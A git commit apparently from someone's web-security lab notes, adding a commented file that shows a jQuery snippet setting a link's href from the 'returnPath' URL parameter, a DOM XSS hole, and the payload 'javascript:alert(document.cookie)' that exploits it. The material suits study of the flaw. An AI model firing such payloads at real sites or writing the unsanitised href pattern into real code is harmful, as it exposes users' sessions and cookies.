9b9a41789e1a9db92abbb7363ece9e2a9f5e7dcc
senior <jedi>
2023-06-17 15:19:45 +0530

    DOM XSS in jquery a tag

---
+++ XSS/DOM XSS in jQuery anchor href attribute sink using location.search source/payload.js
@@ -0,0 +1,13 @@
+/*
+
+<a id="backLink" href="/post">Back</a>
+
+$(function() { 
+    $('#backLink').attr("href",
+    (new URLSearchParams(window.location.search)).get('returnPath'));
+}); 
+
+javascript:alert(document.cookie)
+
+
+*/
